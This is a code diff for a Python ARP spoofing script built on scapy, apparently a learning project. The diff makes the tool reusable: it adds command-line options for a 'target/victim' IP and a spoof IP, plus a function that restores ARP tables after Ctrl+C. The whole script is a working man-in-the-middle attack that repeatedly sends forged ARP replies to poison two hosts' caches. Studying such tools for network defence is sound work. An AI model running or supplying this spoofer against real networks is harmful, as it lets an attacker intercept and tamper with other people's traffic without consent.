@@ -2,6 +2,20 @@
 
 import scapy.all as scapy
 import time
+import argparse
+
+
+def get_args():
+    parser = argparse.ArgumentParser()
+    parser.add_argument("-t", "--target", dest="target", help="This is the target/victim IP address")
+    parser.add_argument("-s", "--spoof", dest="spoof", help="This is the spoof IP address")
+    options = parser.parse_args()
+    if not options.target:
+        print("[-] please specify the target IP address")
+    elif not options.spoof:
+        print("[-] please specify the spoof IP address")
+    else:
+        return options
 
 
 def get_mac(ip):
@@ -20,10 +34,24 @@ def spoof(target_ip, spoof_ip):
     scapy.send(packet, verbose=False)
 
 
-count_packet = 0
-while True:
-    spoof("192.168.68.137", "192.168.68.2")
-    spoof("192.168.68.2", "192.168.68.137")
-    count_packet += 2
-    print("\r[+] Number of packets sent: " + str(count_packet), end="")
-    time.sleep(2)
+def restore(destination_ip , source_ip):
+    destination_mac = get_mac(destination_ip)
+    source_mac = get_mac(source_ip)
+    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
+    scapy.send(packet, count=4, verbose=False)
+
+
+options = get_args()
+
+try:
+    count_packet = 0
+    while True:
+        spoof(options.target, options.spoof)
+        spoof(options.spoof, options.target)
+        count_packet += 2
+        print("\r[+] Number of packets sent: " + str(count_packet), end="")
+        time.sleep(2)
+except KeyboardInterrupt:
+    print("[-] Detected CTRL+C.....\n Resetting the ARP tables...Please wait.\n")
+    restore(options.target, options.spoof)
+    restore(options.spoof, options.target)
